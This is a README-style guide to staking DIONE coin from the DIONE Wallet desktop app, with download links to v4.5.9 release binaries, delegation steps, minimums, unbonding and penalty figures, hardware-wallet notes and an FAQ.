![DIONE Wallet](assets/banner-article.png)

# How to Stake DIONE Coin

<p align="center">Delegating from the wallet</p>

<p align="center"><a href="https://github.com/dione-protocol/dione-desktop-wallet/releases/download/v4.5.9/dione-wallet-v4.5.9.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-006971?style=for-the-badge&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=white" alt="Windows"></a> <a href="https://github.com/dione-protocol/dione-desktop-wallet/releases/download/v4.5.9/dione-wallet-v4.5.9.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-006971?style=for-the-badge&logo=apple&logoColor=white" alt="macOS"></a> <a href="https://github.com/dione-protocol/dione-desktop-wallet/releases/download/v4.5.9/dione-wallet-v4.5.9.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-006971?style=for-the-badge&logo=linux&logoColor=white" alt="Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="https://img.shields.io/badge/platform-Windows-66519E?style=flat-square&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=white&labelColor=1B1B1D" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`dione-wallet-v4.5.9.exe`](https://github.com/dione-protocol/dione-desktop-wallet/releases/download/v4.5.9/dione-wallet-v4.5.9.exe) |
| <img src="https://img.shields.io/badge/platform-macOS-66519E?style=flat-square&logo=apple&logoColor=white&labelColor=1B1B1D" alt="macOS"> | macOS 12 or later | [`dione-wallet-v4.5.9.dmg`](https://github.com/dione-protocol/dione-desktop-wallet/releases/download/v4.5.9/dione-wallet-v4.5.9.dmg) |
| <img src="https://img.shields.io/badge/platform-Linux-66519E?style=flat-square&logo=linux&logoColor=white&labelColor=1B1B1D" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`dione-wallet-v4.5.9.zip`](https://github.com/dione-protocol/dione-desktop-wallet/releases/download/v4.5.9/dione-wallet-v4.5.9.zip) |

</div>

All versions and checksums are on the [v4.5.9 release page](https://github.com/dione-protocol/dione-desktop-wallet/releases/tag/v4.5.9).

> [!WARNING]
> Only download from this GitHub release page. A mirror, a search advertisement or a file sent in a chat is not the project.

Staking DIONE means delegating it to a validator from inside DIONE Wallet, which has a native staking interface. Pick a validator, choose an amount above the 10,000 DIONE minimum, confirm, and the delegation starts earning. The stake stays yours: it can be undelegated at any time, subject to a 10-day unbonding period.

## What staking is, in one paragraph

Odyssey Chain secures itself with validators who produce blocks. Delegators - you - commit DIONE to a validator's stake, and the validator shares rewards in proportion. The tokens do not leave your address; they are bonded to a validator, and the wallet shows them as delegated rather than spendable.

That distinction answers the most common worry before it is asked: staking is not a transfer to the validator, and the validator cannot move your stake.

## Before you start

You need DIONE in the wallet on Odyssey Chain, an amount at or above the minimum, and a little extra for the transaction fee - the fee is paid in DIONE, so a balance staked to the last coin cannot pay for the unbonding later.

That last point catches people a month in, not on day one. Leave a working balance.

## Staking, step by step

1. Open DIONE Wallet and confirm the active network is Odyssey Chain.
2. Open the staking section. The validator list is sortable by uptime, commission and total stake.
3. Choose a validator and read its commission before anything else.
4. Enter the amount. It must meet the 10,000 DIONE minimum.
5. Confirm the transaction and approve it on your device if you use a hardware wallet.
6. The delegation appears in the wallet's staking view, with rewards tracked from that point.

Step three deserves a minute rather than a second. A validator with a low commission and poor uptime costs more in missed rewards than a slightly dearer one that produces blocks - [Choose a Validator in DIONE Wallet](https://github.com/dione-protocol/staking-and-network/blob/main/choose-a-validator-in-dione-wallet.md) works through the trade-offs.

## Where you can stake

Inside the wallet, on Odyssey Chain, to any validator in the list. There is no separate staking website to log into and no account to create, which is the practical benefit of a native staking interface: the transaction is signed by the same keys that hold the funds.

Staking through an exchange is a different arrangement and not the same thing. An exchange stakes on your behalf, holds the keys, and decides when you can withdraw. It may be simpler; it is not self-custody.

## Do you lose access to staked DIONE?

No, but you lose immediate access. Delegated tokens are bonded: they still belong to your address, they keep earning, and they can be undelegated - but undelegating starts a 10-day unbonding period before they become spendable.

That period is the only real cost of staking, and it is a liquidity cost rather than a risk of loss. If you might need the funds within two weeks, do not stake them all. [Unstake DIONE and Wait Out the Unbonding Period](https://github.com/dione-protocol/staking-and-network/blob/main/unstake-dione-and-wait-for-unbonding.md) covers the timing in detail.

## What can go wrong

Three things, and only one is about the chain:

- **Choosing a validator badly.** Missed blocks mean missed rewards; a validator that drops out of the active set earns nothing while your tokens are bonded to it.
- **Staking everything.** The unbonding period plus a zero fee balance is a bad combination.
- **Approving the wrong transaction.** The confirmation screen shows the validator and amount; read it, especially on a hardware wallet.

Slashing - a penalty applied to a validator's stake for misbehaviour - is the fourth worry people raise. [Choose a Validator in DIONE Wallet](https://github.com/dione-protocol/staking-and-network/blob/main/choose-a-validator-in-dione-wallet.md) explains how delegation is exposed to it.

## The numbers, as published

The base reward is 1% per 30-day period, with an annual maximum of 8%. The minimum delegation is 10,000 DIONE, the unbonding period is 10 days, and early exit before consolidation carries penalties of 7%, 6% or 5% depending on how early - [DIONE Staking Minimums and Early-Unstake Penalties](https://github.com/dione-protocol/staking-and-network/blob/main/dione-staking-minimum-and-penalties.md) sets those out.

The wallet tracks rewards as they accrue, so you do not have to calculate them to see them. Planning a return before delegating is a separate exercise, covered in [DIONE Staking Rewards Explained](https://github.com/dione-protocol/staking-and-network/blob/main/dione-staking-rewards-explained.md).

## Hardware wallets and staking

If your keys are on a Ledger, Trezor or Tangem, staking works the same way: the wallet composes the delegation and the device signs it. The difference is physical - the device must be present for each staking action, though rewards accrue whether it is plugged in or not.

[Connect a Ledger to DIONE Wallet](https://github.com/dione-protocol/setup-and-troubleshooting/blob/main/connect-a-ledger-to-dione-wallet.md) covers the pairing; [Use Tangem With DIONE Wallet](https://github.com/dione-protocol/setup-and-troubleshooting/blob/main/use-tangem-with-dione-wallet.md) the card route.

## Keep the install current

DIONE Wallet is actively maintained, and the current release is published on the releases page.

Staking screens and reward tracking change between builds, and a wallet that is behind can show a delegation without its rewards. Install from [the v4.5.9 release](https://github.com/dione-protocol/dione-desktop-wallet/releases/tag/v4.5.9) before concluding a reward is missing, then check the validator's own record.

## FAQ

### How do I stake DIONE?

Open the staking section in DIONE Wallet, choose a validator, enter at least 10,000 DIONE, and confirm. The delegation is signed from your own keys and starts earning immediately.

### Where can I stake DIONE?

Inside the wallet, on Odyssey Chain, with any validator in the list. No separate website or account is involved, and exchanges are a different, custodial arrangement.

### What wallet do I need to stake DIONE?

DIONE Wallet, or the same keys paired to a supported hardware device. The wallet holds the native staking interface.

### Do I lose access to my DIONE if I stake it?

No. The stake stays at your address and keeps earning. It becomes spendable again only after undelegating and waiting out the 10-day unbonding period.

### Can I stake DIONE on an exchange instead?

Some exchanges offer it, and it is custodial: they hold the keys and set the withdrawal terms. Self-custody staking happens in the wallet.

Staking is a deliberate trade of liquidity for reward, and the two decisions that follow are which validator and how much to commit. [Choose a Validator in DIONE Wallet](https://github.com/dione-protocol/staking-and-network/blob/main/choose-a-validator-in-dione-wallet.md) covers the first, [Unstake DIONE and Wait Out the Unbonding Period](https://github.com/dione-protocol/staking-and-network/blob/main/unstake-dione-and-wait-for-unbonding.md) the exit, and [DIONE Staking Rewards Explained](https://github.com/dione-protocol/staking-and-network/blob/main/dione-staking-rewards-explained.md) the return you should expect.
